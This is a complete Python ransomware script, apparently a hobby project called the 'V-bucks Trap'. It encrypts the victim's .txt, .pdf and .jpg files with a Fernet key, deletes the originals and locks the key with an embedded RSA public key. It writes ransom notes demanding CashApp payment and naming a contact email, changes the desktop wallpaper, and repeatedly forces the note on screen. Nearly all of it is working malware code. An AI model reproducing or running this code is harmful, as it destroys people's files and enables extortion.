import os
import sys
import rsa
import time
import ctypes
import datetime
import win32gui
import platform
import subprocess
import urllib.request
import threading
from cryptography.fernet import Fernet

# This function will check for the victim's Operating System.
def OS_checker():

    if "Windows" in System_Info:
        print("V-bucks Trap Activated! Any attempt to stop this will ruin your machine forever...")
    elif "Linux" in System_Info:
        if os.geteuid() != 0:
            print("Please run this with sudo in order for the process to work!")
            sys.exit(1)
        else:
            print("V-bucks Trap Activated! Any attempt to stop this will ruin your machine forever...")
    else:
        pass
    
        # Note: These 2 print statements will demonstrate what the System_info and systemRoot variables contain for testing/debugging purposes or just general curiosity.

        #print("This is what the systemRoot variable is referring to: -> " + systemRoot)
        #print("This is what the System_Info variable above contains as a result of the platform.platform() command: -> " + System_Info) 
     
# Asymmetric public key used to lock the fernet key after files have been encrypted
public_key_pem = """
-----BEGIN RSA PUBLIC KEY-----
MIIBCgKCAQEAgcoWsUdseU21eqiUDDuv3yReCOwyaX5F95nEr0dBqgbnV3wAUdCB
8FopjKtopEGVUR412i+s2O+hp5ZTPfo9XxJB8hj2IIIhyxHNcrPdxGTbNQSkxkDB
d5q55kI+SoYDoyG7/QUZBuDvCvSCm01NC+r2guT8fpMqQCeu0S++l3QA0FFD8mdb
AM0mBkkgtU4wh84rvqTik2rJuJqXh7fEbNXS1d+LiVXwBrm7LxKR1WuOpXCjoB6I
126d34iud2cBOOUlOGK1DnIIUeKBVjc6XXYtZz+JWjoiobaETBpA94i8W3htDL/W
btJqj6xc3SZpaGhFJiEnfaCSGZmWGEwufQIDAQAB
-----END RSA PUBLIC KEY-----"""

# This function will create a fernet symmetric key that will be used to encrypt and decrypt the victim's files.
def create_fernet_key():

    fernet_key = Fernet.generate_key()          
    with open('fernet_key.txt', 'wb') as file:
        file.write(fernet_key)
    with open('fernet_key.txt', 'rb') as file:
        global key
        key = file.read()

# This function will seek out and encrypt the victim's files.
def encrypting_files():

    # Defining which files to encrypt
    file_extensions = ['.txt', '.pdf', '.jpg']

    # Pulling path of all files in the system and checking for matching extentions
    file_paths = []
    for root, dirs, files_list, in os.walk(f'{systemRoot}/# Put Your Respective Path Here for Debugging/Testing'):
        for file in files_list:
            file_path = os.path.join(root, file)
            file_ext = os.path.splitext(file_path)[1].lower()
            if file_ext in file_extensions:
                file_paths.append(file_path)
                
    # Encrypting each chosen file with the fernet key
    for file_path in file_paths:
        with open(file_path, 'rb') as file:
            file_data = file.read()
        fernet = Fernet(key)
        encrypted_data = fernet.encrypt(file_data)
        new_file = file_path + ".lol"               # Adds custom extension name and removes old file name
        with open(new_file, 'wb') as file:
            file.write(encrypted_data)
        os.remove(file_path)

# This function will encrypt the fernet key and write it into a file to be sent to the attacker for decryption.
def encrypting_fernet_key():

    # Calling RSA public key    
    public_key = rsa.PublicKey.load_pkcs1(public_key_pem.encode())
    # Encrypting fernet key with public key
    with open('fernet_key.txt', 'rb') as f:
        data = f.read()
    encrypted_data = rsa.encrypt(data, public_key)
    with open(f'{systemRoot}/OneDrive/Desktop/EMAIL_THIS_FILE_TO_US.txt', 'wb') as f:       #You May Have To Change This Path Depending on Target OS Path
            f.write(encrypted_data)


# This function will generate a Ransomnote.
def creating_ransom_note():
    
    date = datetime.date.today().strftime('%B-%d-%Y')
    with open('Hacked.txt', 'w') as f:
        f.write("Today is " + date + "." + " Your systems has beec comrpomised. To recover your data send $5 to H@x0r5 on cashapp. After you've paid, send the file 'EMAIL_THIS_FILE_TO_US.txt' to jasonbarrytheculprit@hotmail.com with the subject 'YOUSSEF SAID I HAD LEARNED THIS ALREADY'. From there we will decrypt the key, send it back to your email and allow you to unencrypt your data. >:)")
    with open('WARNING.txt', 'w') as f:
                f.write("Follow instructions or lose your information. The choice is yours...")
    with open('Congratulations.txt', 'w') as f:
        f.write("Your system has been released from our clutches. I hope the Vbucks were worth it XDDDDDDDD")

# This function will change the background wallpaper on the system.
def background_change():

    image_URL = 'https://i.imgur.com/41dRpyJ.jpeg'
    path = f'{systemRoot}/OneDrive/Desktop/background.jpg'
    urllib.request.urlretrieve(image_URL, path)
    SPI_SETDESKWALLPAPER = 20
    ctypes.windll.user32.SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, path, 0)

# This function will open the ransomnote in the Notepad Text Editor. It will also continuously check every 10 seconds if the Ransom Note is the current active window (In Front)
# and will re-open the ransom note after a short warning has been issued if the ransom note is not the current active window.
def show_the_note():

    if "Windows" in System_Info:
        ransom_note = subprocess.Popen(['notepad.exe', 'Hacked.txt'])
        while True:
            time.sleep(5)
            top_window = win32gui.GetWindowText(win32gui.GetForegroundWindow())
            if top_window == 'Hacked - Notepad':
                pass
            else:
                time.sleep(2)
                angry_note = subprocess.Popen(['notepad.exe', 'WARNING.txt'])
                time.sleep(5)
                angry_note.kill()
                time.sleep(0.1)
                ransom_note.kill()
                time.sleep(0.1)
                ransom_note = subprocess.Popen(['notepad.exe', 'Hacked.txt'])
                time.sleep(7)
            if verifier == True:
                ransom_note.kill()
                time.sleep(0.1)
                angry_note.kill()
                time.sleep(0.1)
                end_note = subprocess.Popen(['notepad.exe', 'Congratulations.txt'])
                time.sleep(10)
                end_note.kill()
                break
    else:
        pass

# This function will continuosly check for the file containing the decrypted Fernet Key which would be provided by the attacker after the victim has paid.
def check_for_desktop_unencryption_file():

    while True:
        try:
            global verifier
            verifier = os.path.exists(f'{systemRoot}/OneDrive/Desktop/PLACE_ME_IN_DESKTOP_TO_UNENCRYPT.txt') #You May Have To Change This Path Depending on Target OS Path
            if verifier == True:
                decrypting_files()
                print("Decrypted Successfully")
                break
            else:
                pass
        except:
                pass
        time.sleep(10)
        print("Checking For Decryption File...")


# Pulling path of all files in the system and checking for matching extensions
def decrypting_files():

    file_extensions = ['.lol']
    file_paths = []
    for root, dirs, files_list in os.walk(f'{systemRoot}/# Put Your Respective Path Here For Debugging/Testing'):
        for file in files_list:
            file_path = os.path.join(root, file)
            file_ext = os.path.splitext(file_path)[1].lower()
            if file_ext in file_extensions:
                file_paths.append(file_path)

    # Decrypting each chosen file with the fernet key          
    with open(f'{systemRoot}/OneDrive/Desktop/PLACE_ME_IN_DESKTOP_TO_UNENCRYPT.txt', 'rb') as file:     #You May Have To Change This Path Depending on Target OS Path
        key = file.read()
    for file_path in file_paths:
        with open(file_path, 'rb') as file:
            file_data = file.read()
        fernet = Fernet(key)
        decrypted_data = fernet.decrypt(file_data)
        restored_file = file_path.strip(".lol")
        with open(restored_file, 'wb') as f:
            f.write(decrypted_data)
        os.remove(file_path)


def main():
     
     global systemRoot
     global System_Info
     System_Info = platform.platform()
     systemRoot = os.path.expanduser('~')
     OS_checker()
     create_fernet_key()
     encrypting_files()
     encrypting_fernet_key()
     creating_ransom_note()
     background_change()
     threading.Thread(target=show_the_note).start()
     time.sleep(2)
     threading.Thread(target=check_for_desktop_unencryption_file).start()

main()
